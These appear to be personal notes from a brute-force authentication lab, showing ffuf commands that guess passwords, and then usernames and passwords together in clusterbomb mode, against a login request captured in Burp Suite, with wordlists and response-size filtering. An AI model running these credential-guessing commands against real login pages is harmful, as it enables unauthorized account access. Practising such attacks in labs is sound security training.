### Brute Force Attack Lab --- 1  ( Authentication 0x01 )

-  Can you Burp Suite Intruder for this, but i am using `ffuf` tool, because its faster. 

> But it is better if you did you the request from the burp intercept.

#### Like this : And save this in a txt and FUZZ that part that you want.

#### What is used in the lab 

```Markdown
# Steps

1. ffuf -request request.txt -request-proto http -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt

2. Let it run for few seconds and then stop it, reason : " filter out the size since we are getting same size " --> use " -fs 1814 " to filter that size out while brute forcing.

```

```markdown

3. Now update the ffuf update by adding -fs switch.

   - ffuf -request request.txt -request-proto http -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt -fs 1814  
     
4. Now it will print other request, apart from request with 1814.
   
# TIP : if u are getting same sizes again and again then do the filtering again.

```

#### FFUF usage for brute forcing both user and pass

```shell
ffuf -request req.txt \
     -request-proto http \
     -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ \
     -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:FUZ2Z \
     -mode clusterbomb
```
